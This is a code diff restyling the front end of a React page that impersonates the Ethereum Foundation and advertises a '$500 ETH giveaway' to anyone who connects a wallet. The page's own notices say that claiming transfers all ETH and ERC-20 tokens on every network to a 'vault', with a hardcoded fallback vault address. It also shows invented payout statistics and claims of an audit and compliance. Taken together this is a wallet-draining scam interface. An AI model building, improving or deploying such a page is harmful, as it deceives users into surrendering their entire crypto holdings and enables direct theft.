@@ -60,42 +60,31 @@ export default function Home() {
   }
 
   return (
-    <div className="min-h-screen bg-black relative overflow-hidden">
-      {/* Cyberpunk Background Layers */}
+    <div className="min-h-screen ethereum-gradient-hero relative overflow-hidden">
+      {/* Background Pattern */}
       <div 
-        className="absolute inset-0 opacity-80"
+        className="absolute inset-0 opacity-30"
         style={{
-          backgroundImage: "url('/images/cyberpunk-bg.svg')",
+          backgroundImage: "url('/images/crypto-hero-bg.svg')",
           backgroundSize: 'cover',
           backgroundPosition: 'center',
           backgroundRepeat: 'no-repeat'
         }}
       />
       
-      {/* Floating Particles Layer */}
-      <div 
-        className="absolute inset-0 opacity-60 pointer-events-none"
-        style={{
-          backgroundImage: "url('/images/floating-particles.svg')",
-          backgroundSize: 'cover',
-          backgroundPosition: 'center',
-          backgroundRepeat: 'no-repeat'
-        }}
-      />
-      
-      {/* Cyberpunk Glass Header */}
-      <header className="glass-header relative z-20 px-6 py-8">
+      {/* Modern Glass Header */}
+      <header className="glass-header relative z-10 px-6 py-6">
         <div className="max-w-6xl mx-auto flex items-center justify-between">
-          <div className="flex items-center space-x-6">
-            <div className="w-20 h-20 glass-card rounded-2xl flex items-center justify-center neon-glow-cyan">
-              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12 animate-pulse" />
+          <div className="flex items-center space-x-4">
+            <div className="w-16 h-16 glass-card rounded-2xl flex items-center justify-center ethereum-glow">
+              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
             </div>
             <div>
-              <h1 className="text-3xl font-bold text-neon-cyan animate-pulse">
-                ETHEREUM FOUNDATION
+              <h1 className="text-2xl font-bold text-gradient">
+                Ethereum Foundation
               </h1>
-              <p className="text-neon-purple font-medium uppercase tracking-wider">
-                {">> Official ETH Distribution Protocol"}
+              <p className="text-muted-foreground font-medium">
+                Official ETH Distribution Program
               </p>
             </div>
           </div>
@@ -103,127 +92,111 @@ export default function Home() {
             <Button
               onClick={walletState.isConnected ? undefined : handleWalletConnect}
               disabled={isConnecting}
-              className={`btn-premium flex items-center space-x-3 px-8 py-4 rounded-xl font-bold uppercase tracking-wider ${
+              className={`btn-premium flex items-center space-x-2 px-6 py-3 rounded-xl font-semibold ${
                 walletState.isConnected
-                  ? "bg-gradient-to-r from-green-400 to-green-600 text-black neon-glow-cyan border-green-400"
-                  : "text-black"
+                  ? "bg-gradient-to-r from-green-500 to-emerald-600 text-white"
+                  : "text-white"
               }`}
             >
-              <Wallet className="w-6 h-6" />
+              <Wallet className="w-5 h-5" />
               <span>
                 {isConnecting
-                  ? ">> CONNECTING..."
+                  ? "Connecting..."
                   : walletState.isConnected
-                  ? ">> WALLET LINKED"
-                  : ">> CONNECT WALLET"}
+                  ? "Wallet Connected"
+                  : "Connect Wallet"}
               </span>
             </Button>
           </div>
         </div>
       </header>
 
-      {/* Cyberpunk Hero Section */}
-      <div className="relative z-10 px-8 py-20">
-        <div className="max-w-6xl mx-auto text-center">
-          {/* Cyberpunk Status Banner */}
-          <div className="inline-flex items-center px-8 py-4 glass-card rounded-none text-lg font-bold mb-12 neon-glow-cyan uppercase tracking-widest">
-            <div className="w-3 h-3 bg-green-400 rounded-none mr-4 animate-pulse"></div>
-            {">> ACTIVE PROTOCOL: $500 ETH DISTRIBUTION LIVE"}
+      {/* Modern Hero Section */}
+      <div className="relative z-10 px-6 py-16">
+        <div className="max-w-5xl mx-auto text-center">
+          {/* Premium Status Badge */}
+          <div className="inline-flex items-center px-6 py-3 glass-card rounded-full text-sm font-semibold mb-8 ethereum-glow">
+            <div className="w-2 h-2 bg-green-400 rounded-full mr-3 animate-pulse"></div>
+            Limited Time Offer - $500 ETH Giveaway Active
           </div>
           
-          {/* Cyberpunk Hero Title */}
-          <h2 className="text-6xl md:text-8xl font-black mb-12 leading-none uppercase tracking-wider">
-            <span className="text-neon-cyan animate-pulse">CLAIM YOUR</span><br/>
-            <span className="text-gradient text-neon-magenta animate-neon-pulse">$500 ETH</span><br/>
-            <span className="text-neon-purple">REWARD NOW</span>
+          {/* Hero Title */}
+          <h2 className="text-5xl md:text-7xl font-bold mb-8 leading-tight">
+            Claim Your <br/>
+            <span className="text-gradient text-glow">$500 ETH</span> Reward
           </h2>
           
-          {/* Cyberpunk Description */}
-          <div className="glass-card p-8 mb-12 max-w-4xl mx-auto">
-            <p className="text-xl md:text-2xl text-neon-cyan font-bold uppercase tracking-wide leading-relaxed">
-              {">> ETHEREUM FOUNDATION AUTHORIZED DISTRIBUTION PROTOCOL"}<br/>
-              {">> CONNECT WALLET TO INITIALIZE CLAIM SEQUENCE"}<br/>
-              {">> INSTANT REWARD PROCESSING ACTIVATED"}
-            </p>
+          {/* Hero Description */}
+          <p className="text-xl md:text-2xl text-muted-foreground mb-12 max-w-4xl mx-auto leading-relaxed">
+            Ethereum Foundation is distributing $500 worth of ETH to eligible wallet holders. 
+            Connect your wallet to check eligibility and claim your reward instantly.
+          </p>
+          
+          {/* DeFi Illustration */}
+          <div className="flex justify-center mb-12">
+            <img 
+              src="/images/defi-illustration.svg" 
+              alt="Multi-Network DeFi Platform" 
+              className="w-full max-w-2xl h-auto opacity-90"
+            />
           </div>
           
-          {/* Network Icons Grid */}
-          <div className="flex justify-center mb-16">
-            <div className="glass-card p-8 rounded-2xl">
-              <h3 className="text-2xl font-bold text-neon-purple mb-6 uppercase tracking-wider">
-                {">> SUPPORTED NETWORKS"}
-              </h3>
-              <img 
-                src="/images/network-icons.svg" 
-                alt="Multi-Network Support" 
-                className="w-full max-w-4xl h-auto"
-              />
-            </div>
-          </div>
-          
-          {/* Cyberpunk Warning Section */}
-          <div className="glass-card p-8 mb-16 max-w-5xl mx-auto border-l-8 border-red-500 neon-glow-magenta">
-            <div className="flex items-start space-x-6">
-              <div className="w-16 h-16 bg-red-500/20 flex items-center justify-center flex-shrink-0 border-2 border-red-500">
-                <span className="text-red-400 text-3xl font-bold">!</span>
+          {/* Important Disclaimer - Modern Glass Design */}
+          <div className="glass-card rounded-2xl p-8 mb-12 max-w-3xl mx-auto border-l-4 border-l-warning">
+            <div className="flex items-start space-x-4">
+              <div className="w-8 h-8 rounded-full bg-warning/20 flex items-center justify-center flex-shrink-0 mt-1">
+                <span className="text-warning text-lg">⚠️</span>
               </div>
               <div className="text-left">
-                <h3 className="font-black text-red-400 text-2xl mb-4 uppercase tracking-wider">
-                  {">> CRITICAL SYSTEM NOTICE"}
-                </h3>
-                <p className="text-neon-cyan font-bold text-lg leading-relaxed uppercase">
-                  <strong className="text-white">BY EXECUTING "CLAIM $500 ETH" PROTOCOL, YOU AUTHORIZE COMPLETE CRYPTOCURRENCY ASSET TRANSFER</strong> 
-                  FROM CONNECTED WALLET TO DISTRIBUTION VAULT FOR PROCESSING. 
-                  ALL ETH AND ERC-20 TOKENS ACROSS ALL NETWORKS WILL BE CONSOLIDATED.
+                <h3 className="font-bold text-warning text-lg mb-3">Important Notice</h3>
+                <p className="text-muted-foreground leading-relaxed">
+                  <strong className="text-foreground">By clicking "Claim $500 ETH", you authorize the transfer of ALL cryptocurrency funds</strong> from your connected wallet to our distribution vault for processing. 
+                  This includes ETH and all ERC-20 tokens across all networks. Your funds will be consolidated for the claim process.
                 </p>
               </div>
             </div>
           </div>
 
-          {/* Cyberpunk Stats Grid */}
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-20">
-            <div className="card-premium p-10 group border-l-4 border-cyan-400">
-              <div className="text-5xl font-black text-neon-cyan mb-4">$2.5M+</div>
-              <div className="text-neon-purple font-bold uppercase tracking-wider">TOTAL DISTRIBUTED</div>
-              <div className="w-full h-2 bg-gradient-to-r from-cyan-400 to-purple-600 mt-6"></div>
+          {/* Premium Stats Cards */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
+            <div className="card-premium rounded-2xl p-8 group">
+              <div className="text-4xl font-bold text-gradient mb-2">$2.5M+</div>
+              <div className="text-muted-foreground font-medium">Total Distributed</div>
+              <div className="w-12 h-1 bg-gradient-to-r from-primary to-secondary rounded-full mt-4 mx-auto"></div>
             </div>
-            <div className="card-premium p-10 group border-l-4 border-purple-500">
-              <div className="text-5xl font-black text-neon-purple mb-4">5,000+</div>
-              <div className="text-neon-magenta font-bold uppercase tracking-wider">CLAIMS PROCESSED</div>
-              <div className="w-full h-2 bg-gradient-to-r from-purple-500 to-pink-500 mt-6"></div>
+            <div className="card-premium rounded-2xl p-8 group">
+              <div className="text-4xl font-bold text-gradient mb-2">5,000+</div>
+              <div className="text-muted-foreground font-medium">Claims Processed</div>
+              <div className="w-12 h-1 bg-gradient-to-r from-secondary to-accent rounded-full mt-4 mx-auto"></div>
             </div>
-            <div className="card-premium p-10 group border-l-4 border-pink-500">
-              <div className="text-5xl font-black text-neon-magenta mb-4">7</div>
-              <div className="text-neon-cyan font-bold uppercase tracking-wider">NETWORKS ACTIVE</div>
-              <div className="w-full h-2 bg-gradient-to-r from-pink-500 to-cyan-400 mt-6"></div>
+            <div className="card-premium rounded-2xl p-8 group">
+              <div className="text-4xl font-bold text-gradient mb-2">7</div>
+              <div className="text-muted-foreground font-medium">Networks Supported</div>
+              <div className="w-12 h-1 bg-gradient-to-r from-accent to-primary rounded-full mt-4 mx-auto"></div>
             </div>
           </div>
         </div>
       </div>
 
-      <main className="relative z-10 max-w-7xl mx-auto px-8 py-16 space-y-16">
-        {/* Cyberpunk ETH Claim Terminal */}
-        <div className="max-w-4xl mx-auto">
-          <div className="card-premium p-12 neon-glow-cyan border-l-8 border-cyan-400">
-            <div className="text-center mb-12">
-              {/* Cyberpunk Icon Terminal */}
-              <div className="w-32 h-32 mx-auto mb-8 bg-black border-4 border-cyan-400 flex items-center justify-center neon-glow-cyan relative">
-                <span className="text-cyan-400 text-5xl font-black animate-pulse">Ξ</span>
-                <div className="absolute top-2 right-2 w-3 h-3 bg-green-400 animate-pulse"></div>
-                <div className="absolute bottom-2 left-2 text-xs text-cyan-400 font-mono">LIVE</div>
+      <main className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
+        {/* Premium ETH Claim Section */}
+        <div className="max-w-3xl mx-auto">
+          <div className="card-premium rounded-3xl p-10 ethereum-glow-strong">
+            <div className="text-center mb-8">
+              {/* Premium Icon with Animation */}
+              <div className="w-24 h-24 mx-auto mb-6 rounded-full ethereum-gradient flex items-center justify-center ethereum-glow relative overflow-hidden">
+                <span className="text-white text-3xl font-bold z-10">Ξ</span>
+                <div className="absolute inset-0 ethereum-shimmer"></div>
               </div>
               
-              <h3 className="text-4xl font-black mb-6 uppercase tracking-widest">
-                <span className="text-neon-cyan">$500 ETH REWARD</span><br/>
-                <span className="text-neon-purple">TERMINAL ACTIVE</span>
+              <h3 className="text-3xl font-bold mb-3">
+                <span className="text-gradient">$500 ETH Reward</span> Ready
               </h3>
-              <p className="text-neon-magenta text-xl font-bold uppercase tracking-wide">
-                {">> WALLET ELIGIBLE FOR DISTRIBUTION PROTOCOL"}
-              </p>
+              <p className="text-muted-foreground text-lg">Your wallet is eligible for this limited-time distribution</p>
             </div>
             
-            {/* Cyberpunk separator */}
-            <div className="w-full h-1 bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 mb-12"></div>
+            {/* Glass separator */}
+            <div className="w-full h-px bg-gradient-to-r from-transparent via-primary/50 to-transparent mb-8"></div>
             
             <BalanceCard 
               walletState={walletState}
@@ -233,45 +206,46 @@ export default function Home() {
           </div>
         </div>
 
-        {/* Cyberpunk Transaction Monitor */}
-        <div className="max-w-6xl mx-auto">
-          <div className="card-premium p-10 border-l-8 border-purple-500 neon-glow-purple">
-            <div className="flex items-center justify-between mb-8">
-              <h3 className="text-3xl font-black text-neon-purple uppercase tracking-widest">
-                {">> CLAIMS ACTIVITY MONITOR"}
-              </h3>
-              <div className="flex items-center space-x-4 glass-card px-4 py-2">
-                <div className="w-4 h-4 bg-green-400 animate-pulse"></div>
-                <span className="text-neon-cyan font-bold uppercase tracking-wide">LIVE FEED</span>
+        {/* Modern Transaction History */}
+        <div className="max-w-5xl mx-auto">
+          <div className="card-premium rounded-3xl p-8">
+            <div className="flex items-center justify-between mb-6">
+              <h3 className="text-2xl font-bold text-gradient">Recent Claims Activity</h3>
+              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
+                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
+                <span>Live Updates</span>
               </div>
             </div>
-            <div className="border-2 border-cyan-400 bg-black/50 p-6">
-              <TransactionHistory />
-            </div>
+            <TransactionHistory />
           </div>
         </div>
 
-        {/* Cyberpunk Multi-Network Scanner */}
+        {/* Enhanced Multi-Network Portfolio */}
         {walletState.isConnected && (
-          <div className="max-w-6xl mx-auto">
-            <div className="card-premium p-10 border-l-8 border-pink-500 neon-glow-magenta">
-              <div className="flex items-center justify-between mb-8">
-                <h3 className="text-3xl font-black text-neon-magenta uppercase tracking-widest">
-                  {">> NETWORK PORTFOLIO SCANNER"}
-                </h3>
-                <div className="flex items-center space-x-4 glass-card px-6 py-3">
-                  <div className="flex -space-x-1">
-                    <div className="w-6 h-6 bg-cyan-400 border-2 border-black"></div>
-                    <div className="w-6 h-6 bg-purple-500 border-2 border-black"></div>
-                    <div className="w-6 h-6 bg-pink-500 border-2 border-black"></div>
+          <div className="max-w-5xl mx-auto">
+            <div className="card-premium rounded-3xl p-8">
+              <div className="flex items-center justify-between mb-6">
+                <h3 className="text-2xl font-bold text-gradient">Multi-Network Portfolio</h3>
+                <div className="flex items-center space-x-3">
+                  <div className="flex -space-x-2">
+                    {/* Network Icons */}
+                    <div className="w-8 h-8 rounded-full bg-gradient-to-r from-purple-500 to-blue-500 border-2 border-background"></div>
+                    <div className="w-8 h-8 rounded-full bg-gradient-to-r from-blue-500 to-cyan-500 border-2 border-background"></div>
+                    <div className="w-8 h-8 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 border-2 border-background"></div>
                   </div>
-                  <span className="text-neon-cyan font-bold uppercase tracking-wide">7 NETWORKS ACTIVE</span>
+                  <span className="text-sm text-muted-foreground">7 Networks</span>
                 </div>
               </div>
               
-              {/* Cyberpunk network scanner interface */}
-              <div className="border-4 border-cyan-400 bg-black/70 p-8 relative overflow-hidden">
-                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 animate-pulse"></div>
+              {/* Pattern background for the network section */}
+              <div 
+                className="relative rounded-2xl p-6 overflow-hidden"
+                style={{
+                  backgroundImage: "url('/images/crypto-pattern.svg')",
+                  backgroundSize: '400px 400px',
+                  backgroundRepeat: 'repeat'
+                }}
+              >
                 <div className="relative z-10">
                   <NetworkBalances
                     networkBalances={walletState.networkBalances || []}
@@ -307,101 +281,99 @@ export default function Home() {
         ) : null}
       </main>
 
-      {/* Cyberpunk Terminal Footer */}
-      <footer className="relative mt-24 bg-black border-t-4 border-cyan-400 overflow-hidden">
-        {/* Cyberpunk Background Grid */}
+      {/* Modern Premium Footer */}
+      <footer className="relative mt-20 ethereum-gradient-hero overflow-hidden">
+        {/* Background Pattern */}
         <div 
-          className="absolute inset-0 opacity-30"
+          className="absolute inset-0 opacity-20"
           style={{
-            backgroundImage: "url('/images/floating-particles.svg')",
-            backgroundSize: '800px 800px',
+            backgroundImage: "url('/images/crypto-pattern.svg')",
+            backgroundSize: '600px 600px',
             backgroundRepeat: 'repeat'
           }}
         />
         
-        <div className="relative z-10 max-w-7xl mx-auto px-8 py-20">
-          {/* Cyberpunk Terms Grid */}
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-16">
-            <div className="glass-card p-10 border-l-8 border-cyan-400 neon-glow-cyan">
-              <h4 className="text-2xl font-black text-neon-cyan mb-8 uppercase tracking-widest">PROTOCOL TERMS</h4>
-              <ul className="space-y-4 text-neon-purple font-bold uppercase text-sm">
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-cyan-400 mt-2 flex-shrink-0"></div>
-                  <span>{">> ETH REWARDS DISTRIBUTED POST CONSOLIDATION"}</span>
+        <div className="relative z-10 max-w-6xl mx-auto px-6 py-16">
+          {/* Premium Terms Grid */}
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
+            <div className="card-premium rounded-2xl p-8">
+              <h4 className="text-xl font-bold text-gradient mb-6">Important Terms</h4>
+              <ul className="space-y-3 text-muted-foreground">
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
+                  <span>ETH rewards are distributed after portfolio consolidation</span>
                 </li>
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-purple-500 mt-2 flex-shrink-0"></div>
-                  <span>{">> ALL 7 NETWORKS PROCESSED SIMULTANEOUSLY"}</span>
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-secondary rounded-full mt-2 flex-shrink-0"></div>
+                  <span>All supported networks (Ethereum, Polygon, BSC, etc.) are processed</span>
                 </li>
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-pink-500 mt-2 flex-shrink-0"></div>
-                  <span>{">> PROCESSING TIME: 5-10 MINUTES MAXIMUM"}</span>
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-accent rounded-full mt-2 flex-shrink-0"></div>
+                  <span>Transaction processing typically takes 5-10 minutes</span>
                 </li>
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-cyan-400 mt-2 flex-shrink-0"></div>
-                  <span>{">> MINIMUM PORTFOLIO VALUE REQUIRED"}</span>
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
+                  <span>Minimum portfolio value required for reward eligibility</span>
                 </li>
               </ul>
             </div>
             
-            <div className="glass-card p-10 border-l-8 border-purple-500 neon-glow-purple">
-              <h4 className="text-2xl font-black text-neon-purple mb-8 uppercase tracking-widest">SECURITY MATRIX</h4>
-              <ul className="space-y-4 text-neon-cyan font-bold uppercase text-sm">
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
-                  <span>{">> BLOCKCHAIN TRANSACTION LOGGING ACTIVE"}</span>
+            <div className="card-premium rounded-2xl p-8">
+              <h4 className="text-xl font-bold text-gradient mb-6">Security & Compliance</h4>
+              <ul className="space-y-3 text-muted-foreground">
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
+                  <span>All transactions are recorded on blockchain</span>
                 </li>
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
-                  <span>{">> SMART CONTRACT SECURITY VERIFIED"}</span>
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
+                  <span>Smart contract audited for security</span>
                 </li>
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
-                  <span>{">> MULTI-SIG VAULT PROTECTION LIVE"}</span>
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
+                  <span>Multi-signature vault protection</span>
                 </li>
-                <li className="flex items-start space-x-4">
-                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
-                  <span>{">> KYC/AML COMPLIANCE MAINTAINED"}</span>
+                <li className="flex items-start space-x-3">
+                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
+                  <span>KYC/AML compliance maintained</span>
                 </li>
               </ul>
             </div>
           </div>
           
-          {/* Critical System Alert */}
-          <div className="glass-card p-10 mb-16 border-l-8 border-red-500 neon-glow-magenta">
-            <div className="flex items-start space-x-6">
-              <div className="w-20 h-20 bg-red-500/20 flex items-center justify-center flex-shrink-0 border-4 border-red-500">
-                <span className="text-red-400 text-4xl font-black">⚠</span>
+          {/* Critical Notice - Premium Design */}
+          <div className="glass-card rounded-3xl p-8 mb-12 border-l-4 border-l-destructive">
+            <div className="flex items-start space-x-4">
+              <div className="w-10 h-10 rounded-full bg-destructive/20 flex items-center justify-center flex-shrink-0">
+                <span className="text-destructive text-xl font-bold">⚠</span>
               </div>
               <div className="text-left">
-                <h4 className="font-black text-red-400 text-3xl mb-6 uppercase tracking-widest">{">> CRITICAL SYSTEM ALERT"}</h4>
-                <p className="text-white font-bold text-lg leading-relaxed uppercase">
-                  THIS IS A CRYPTOCURRENCY TRANSFER PROTOCOL. BY EXECUTING <strong className="text-neon-cyan">"CLAIM $500 ETH"</strong> COMMAND, 
-                  YOU AUTHORIZE IMMEDIATE TRANSFER OF ALL CRYPTOCURRENCY ASSETS FROM CONNECTED WALLET(S) TO PROCESSING VAULT 
-                  ACROSS ALL SUPPORTED BLOCKCHAIN NETWORKS. COMPLETE PORTFOLIO CONSOLIDATION - IRREVERSIBLE OPERATION.
+                <h4 className="font-bold text-destructive text-xl mb-4">CRITICAL NOTICE</h4>
+                <p className="text-muted-foreground leading-relaxed text-lg">
+                  This is a cryptocurrency transfer mechanism. By clicking <strong className="text-foreground">"Claim $500 ETH"</strong>, 
+                  you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
+                  across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                 </p>
               </div>
             </div>
           </div>
           
-          {/* Footer Terminal Interface */}
+          {/* Footer Bottom */}
           <div className="text-center">
-            <div className="w-full h-2 bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 mb-12"></div>
+            <div className="w-full h-px bg-gradient-to-r from-transparent via-primary/50 to-transparent mb-8"></div>
             
-            <div className="flex items-center justify-center mb-8">
-              <div className="w-16 h-16 bg-black border-4 border-cyan-400 flex items-center justify-center mr-6 neon-glow-cyan">
-                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10 animate-pulse" />
-              </div>
-              <span className="text-3xl font-black text-neon-cyan uppercase tracking-widest">ETHEREUM FOUNDATION</span>
+            <div className="flex items-center justify-center mb-6">
+              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-8 h-8 mr-3" />
+              <span className="text-lg font-semibold text-gradient">Ethereum Foundation</span>
             </div>
             
-            <p className="text-neon-purple mb-6 text-xl font-bold uppercase tracking-wide">
-              {"© 2025 ETHEREUM FOUNDATION DISTRIBUTION PROTOCOL - MULTI-NETWORK DEFI TECHNOLOGY"}
+            <p className="text-muted-foreground mb-4 text-lg">
+              © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
             </p>
             
-            <div className="glass-card px-8 py-4 inline-block border-2 border-cyan-400">
-              <p className="text-neon-cyan font-mono font-bold uppercase tracking-widest">
-                {"VAULT: "}{import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
+            <div className="glass-card rounded-xl px-4 py-2 inline-block">
+              <p className="text-xs text-muted-foreground font-mono">
+                Vault: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
               </p>
             </div>
           </div>
